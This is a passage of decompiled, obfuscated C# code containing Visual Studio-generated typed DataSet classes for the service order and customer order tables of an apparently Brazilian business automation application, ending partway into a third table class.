			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_ORDEMSERVICORow this[int index] => (TB_ORDEMSERVICORow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_ORDEMSERVICORowChangeEventHandler TB_ORDEMSERVICORowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_ORDEMSERVICORowChangeEventHandler TB_ORDEMSERVICORowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_ORDEMSERVICORowChangeEventHandler TB_ORDEMSERVICORowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_ORDEMSERVICORowChangeEventHandler TB_ORDEMSERVICORowDeleted;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_ORDEMSERVICODataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1490);
				BeginInit();
				InitClass();
				EndInit();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_ORDEMSERVICODataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected TB_ORDEMSERVICODataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void AddTB_ORDEMSERVICORow(TB_ORDEMSERVICORow row)
			{
				base.Rows.Add(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_ORDEMSERVICORow AddTB_ORDEMSERVICORow(string NOME_CLI, string CONTA_CLI, string TEL_CONTATO, string APARELHO, string MARCA, string MODELO, string NUM_SERIE, string ACESSORIO, string MARCAS_USO, string DEFEITO, string SERVICO_EXECUTADO, string DATA_ENTRADA, string DATA_SAIDA, string OBSERVACAO, string PARTE_DANIFICADA, string TEL_FIXO, decimal PRECO_SERVICO)
			{
				TB_ORDEMSERVICORow tB_ORDEMSERVICORow = (TB_ORDEMSERVICORow)NewRow();
				object[] itemArray = new object[18]
				{
					null, NOME_CLI, CONTA_CLI, TEL_CONTATO, APARELHO, MARCA, MODELO, NUM_SERIE, ACESSORIO, MARCAS_USO,
					DEFEITO, SERVICO_EXECUTADO, DATA_ENTRADA, DATA_SAIDA, OBSERVACAO, PARTE_DANIFICADA, TEL_FIXO, PRECO_SERVICO
				};
				tB_ORDEMSERVICORow.ItemArray = itemArray;
				base.Rows.Add(tB_ORDEMSERVICORow);
				return tB_ORDEMSERVICORow;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_ORDEMSERVICORow FindByNUM_ORDEM(int NUM_ORDEM)
			{
				return (TB_ORDEMSERVICORow)base.Rows.Find(new object[1] { NUM_ORDEM });
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public override DataTable Clone()
			{
				TB_ORDEMSERVICODataTable tB_ORDEMSERVICODataTable = (TB_ORDEMSERVICODataTable)base.Clone();
				tB_ORDEMSERVICODataTable.InitVars();
				return tB_ORDEMSERVICODataTable;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataTable CreateInstance()
			{
				return new TB_ORDEMSERVICODataTable();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal void InitVars()
			{
				columnNUM_ORDEM = base.Columns[\u0004.\u0001.\u0001(4250)];
				columnNOME_CLI = base.Columns[\u0004.\u0001.\u0001(2306)];
				columnCONTA_CLI = base.Columns[\u0004.\u0001.\u0001(4272)];
				columnTEL_CONTATO = base.Columns[\u0004.\u0001.\u0001(4294)];
				columnAPARELHO = base.Columns[\u0004.\u0001.\u0001(4320)];
				columnMARCA = base.Columns[\u0004.\u0001.\u0001(4340)];
				columnMODELO = base.Columns[\u0004.\u0001.\u0001(4354)];
				columnNUM_SERIE = base.Columns[\u0004.\u0001.\u0001(4370)];
				columnACESSORIO = base.Columns[\u0004.\u0001.\u0001(4392)];
				columnMARCAS_USO = base.Columns[\u0004.\u0001.\u0001(4414)];
				columnDEFEITO = base.Columns[\u0004.\u0001.\u0001(4438)];
				columnSERVICO_EXECUTADO = base.Columns[\u0004.\u0001.\u0001(4456)];
				columnDATA_ENTRADA = base.Columns[\u0004.\u0001.\u0001(4494)];
				columnDATA_SAIDA = base.Columns[\u0004.\u0001.\u0001(4522)];
				columnOBSERVACAO = base.Columns[\u0004.\u0001.\u0001(2590)];
				columnPARTE_DANIFICADA = base.Columns[\u0004.\u0001.\u0001(4546)];
				columnTEL_FIXO = base.Columns[\u0004.\u0001.\u0001(4582)];
				columnPRECO_SERVICO = base.Columns[\u0004.\u0001.\u0001(4602)];
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			private void InitClass()
			{
				columnNUM_ORDEM = new DataColumn(\u0004.\u0001.\u0001(4250), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnNUM_ORDEM);
				columnNOME_CLI = new DataColumn(\u0004.\u0001.\u0001(2306), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnNOME_CLI);
				columnCONTA_CLI = new DataColumn(\u0004.\u0001.\u0001(4272), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCONTA_CLI);
				columnTEL_CONTATO = new DataColumn(\u0004.\u0001.\u0001(4294), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnTEL_CONTATO);
				columnAPARELHO = new DataColumn(\u0004.\u0001.\u0001(4320), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnAPARELHO);
				columnMARCA = new DataColumn(\u0004.\u0001.\u0001(4340), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnMARCA);
				columnMODELO = new DataColumn(\u0004.\u0001.\u0001(4354), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnMODELO);
				columnNUM_SERIE = new DataColumn(\u0004.\u0001.\u0001(4370), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnNUM_SERIE);
				columnACESSORIO = new DataColumn(\u0004.\u0001.\u0001(4392), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnACESSORIO);
				columnMARCAS_USO = new DataColumn(\u0004.\u0001.\u0001(4414), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnMARCAS_USO);
				columnDEFEITO = new DataColumn(\u0004.\u0001.\u0001(4438), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDEFEITO);
				columnSERVICO_EXECUTADO = new DataColumn(\u0004.\u0001.\u0001(4456), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnSERVICO_EXECUTADO);
				columnDATA_ENTRADA = new DataColumn(\u0004.\u0001.\u0001(4494), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDATA_ENTRADA);
				columnDATA_SAIDA = new DataColumn(\u0004.\u0001.\u0001(4522), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDATA_SAIDA);
				columnOBSERVACAO = new DataColumn(\u0004.\u0001.\u0001(2590), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnOBSERVACAO);
				columnPARTE_DANIFICADA = new DataColumn(\u0004.\u0001.\u0001(4546), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnPARTE_DANIFICADA);
				columnTEL_FIXO = new DataColumn(\u0004.\u0001.\u0001(4582), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnTEL_FIXO);
				columnPRECO_SERVICO = new DataColumn(\u0004.\u0001.\u0001(4602), typeof(decimal), null, MappingType.Element);
				base.Columns.Add(columnPRECO_SERVICO);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnNUM_ORDEM }, isPrimaryKey: true));
				columnNUM_ORDEM.AutoIncrement = true;
				columnNUM_ORDEM.AutoIncrementSeed = -1L;
				columnNUM_ORDEM.AutoIncrementStep = -1L;
				columnNUM_ORDEM.AllowDBNull = false;
				columnNUM_ORDEM.Unique = true;
				columnNOME_CLI.MaxLength = 50;
				columnCONTA_CLI.MaxLength = 30;
				columnTEL_CONTATO.MaxLength = 16;
				columnAPARELHO.MaxLength = 10;
				columnMARCA.MaxLength = 20;
				columnMODELO.MaxLength = 20;
				columnNUM_SERIE.MaxLength = 15;
				columnACESSORIO.MaxLength = 70;
				columnMARCAS_USO.MaxLength = 100;
				columnDEFEITO.MaxLength = 100;
				columnSERVICO_EXECUTADO.MaxLength = 100;
				columnDATA_ENTRADA.MaxLength = 10;
				columnDATA_SAIDA.MaxLength = 10;
				columnOBSERVACAO.MaxLength = 150;
				columnPARTE_DANIFICADA.MaxLength = 100;
				columnTEL_FIXO.MaxLength = 14;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_ORDEMSERVICORow NewTB_ORDEMSERVICORow()
			{
				return (TB_ORDEMSERVICORow)NewRow();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_ORDEMSERVICORow(builder);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override Type GetRowType()
			{
				return typeof(TB_ORDEMSERVICORow);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void RemoveTB_ORDEMSERVICORow(TB_ORDEMSERVICORow row)
			{
				base.Rows.Remove(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(4632)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_PEDIDODataTable : DataTable, IEnumerable
		{
			private DataColumn columnCOD_PEDIDO;

			private DataColumn columnCLIENTE;

			private DataColumn columnPRODUTO;

			private DataColumn columnDAT_PEDIDO;

			private DataColumn columnFONE;

			private DataColumn columnPRECO_CUSTO;

			private DataColumn columnPRECO_FINAL;

			private DataColumn columnQUANT_PEDIDA;

			private DataColumn columnMARGEM_LUCRO;

			private DataColumn columnENDERECO;

			private DataColumn columnCIDADE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn COD_PEDIDOColumn => columnCOD_PEDIDO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CLIENTEColumn => columnCLIENTE;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn PRODUTOColumn => columnPRODUTO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DAT_PEDIDOColumn => columnDAT_PEDIDO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn FONEColumn => columnFONE;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn PRECO_CUSTOColumn => columnPRECO_CUSTO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn PRECO_FINALColumn => columnPRECO_FINAL;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn QUANT_PEDIDAColumn => columnQUANT_PEDIDA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn MARGEM_LUCROColumn => columnMARGEM_LUCRO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn ENDERECOColumn => columnENDERECO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CIDADEColumn => columnCIDADE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[Browsable(false)]
			[DebuggerNonUserCode]
			public int Count => base.Rows.Count;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_PEDIDORow this[int index] => (TB_PEDIDORow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_PEDIDORowChangeEventHandler TB_PEDIDORowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_PEDIDORowChangeEventHandler TB_PEDIDORowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_PEDIDORowChangeEventHandler TB_PEDIDORowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_PEDIDORowChangeEventHandler TB_PEDIDORowDeleted;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_PEDIDODataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1524);
				BeginInit();
				InitClass();
				EndInit();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal TB_PEDIDODataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected TB_PEDIDODataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void AddTB_PEDIDORow(TB_PEDIDORow row)
			{
				base.Rows.Add(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_PEDIDORow AddTB_PEDIDORow(string CLIENTE, string PRODUTO, string DAT_PEDIDO, string FONE, string PRECO_CUSTO, string PRECO_FINAL, string QUANT_PEDIDA, string MARGEM_LUCRO, string ENDERECO, string CIDADE)
			{
				TB_PEDIDORow tB_PEDIDORow = (TB_PEDIDORow)NewRow();
				object[] itemArray = new object[11]
				{
					null, CLIENTE, PRODUTO, DAT_PEDIDO, FONE, PRECO_CUSTO, PRECO_FINAL, QUANT_PEDIDA, MARGEM_LUCRO, ENDERECO,
					CIDADE
				};
				tB_PEDIDORow.ItemArray = itemArray;
				base.Rows.Add(tB_PEDIDORow);
				return tB_PEDIDORow;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_PEDIDORow FindByCOD_PEDIDO(int COD_PEDIDO)
			{
				return (TB_PEDIDORow)base.Rows.Find(new object[1] { COD_PEDIDO });
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public override DataTable Clone()
			{
				TB_PEDIDODataTable tB_PEDIDODataTable = (TB_PEDIDODataTable)base.Clone();
				tB_PEDIDODataTable.InitVars();
				return tB_PEDIDODataTable;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataTable CreateInstance()
			{
				return new TB_PEDIDODataTable();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal void InitVars()
			{
				columnCOD_PEDIDO = base.Columns[\u0004.\u0001.\u0001(4684)];
				columnCLIENTE = base.Columns[\u0004.\u0001.\u0001(4708)];
				columnPRODUTO = base.Columns[\u0004.\u0001.\u0001(4726)];
				columnDAT_PEDIDO = base.Columns[\u0004.\u0001.\u0001(4744)];
				columnFONE = base.Columns[\u0004.\u0001.\u0001(4768)];
				columnPRECO_CUSTO = base.Columns[\u0004.\u0001.\u0001(3086)];
				columnPRECO_FINAL = base.Columns[\u0004.\u0001.\u0001(4780)];
				columnQUANT_PEDIDA = base.Columns[\u0004.\u0001.\u0001(4806)];
				columnMARGEM_LUCRO = base.Columns[\u0004.\u0001.\u0001(3242)];
				columnENDERECO = base.Columns[\u0004.\u0001.\u0001(2344)];
				columnCIDADE = base.Columns[\u0004.\u0001.\u0001(2364)];
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			private void InitClass()
			{
				columnCOD_PEDIDO = new DataColumn(\u0004.\u0001.\u0001(4684), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnCOD_PEDIDO);
				columnCLIENTE = new DataColumn(\u0004.\u0001.\u0001(4708), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCLIENTE);
				columnPRODUTO = new DataColumn(\u0004.\u0001.\u0001(4726), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnPRODUTO);
				columnDAT_PEDIDO = new DataColumn(\u0004.\u0001.\u0001(4744), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDAT_PEDIDO);
				columnFONE = new DataColumn(\u0004.\u0001.\u0001(4768), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnFONE);
				columnPRECO_CUSTO = new DataColumn(\u0004.\u0001.\u0001(3086), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnPRECO_CUSTO);
				columnPRECO_FINAL = new DataColumn(\u0004.\u0001.\u0001(4780), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnPRECO_FINAL);
				columnQUANT_PEDIDA = new DataColumn(\u0004.\u0001.\u0001(4806), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnQUANT_PEDIDA);
				columnMARGEM_LUCRO = new DataColumn(\u0004.\u0001.\u0001(3242), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnMARGEM_LUCRO);
				columnENDERECO = new DataColumn(\u0004.\u0001.\u0001(2344), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnENDERECO);
				columnCIDADE = new DataColumn(\u0004.\u0001.\u0001(2364), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCIDADE);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnCOD_PEDIDO }, isPrimaryKey: true));
				columnCOD_PEDIDO.AutoIncrement = true;
				columnCOD_PEDIDO.AutoIncrementSeed = -1L;
				columnCOD_PEDIDO.AutoIncrementStep = -1L;
				columnCOD_PEDIDO.AllowDBNull = false;
				columnCOD_PEDIDO.Unique = true;
				columnCLIENTE.MaxLength = 70;
				columnPRODUTO.MaxLength = 70;
				columnDAT_PEDIDO.MaxLength = 10;
				columnFONE.MaxLength = 16;
				columnPRECO_CUSTO.MaxLength = 10;
				columnPRECO_FINAL.MaxLength = 10;
				columnQUANT_PEDIDA.MaxLength = 10;
				columnMARGEM_LUCRO.MaxLength = 10;
				columnENDERECO.MaxLength = 50;
				columnCIDADE.MaxLength = 50;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_PEDIDORow NewTB_PEDIDORow()
			{
				return (TB_PEDIDORow)NewRow();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_PEDIDORow(builder);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override Type GetRowType()
			{
				return typeof(TB_PEDIDORow);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void RemoveTB_PEDIDORow(TB_PEDIDORow row)
			{
				base.Rows.Remove(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(4834)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_TIPOLANCAMENTODataTable : DataTable, IEnumerable
		{
			private DataColumn columnDescrição;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DescriçãoColumn => columnDescrição;

			[Browsable(false)]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public int Count => base.Rows.Count;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_TIPOLANCAMENTORow this[int index] => (TB_TIPOLANCAMENTORow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_TIPOLANCAMENTORowChangeEventHandler TB_TIPOLANCAMENTORowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
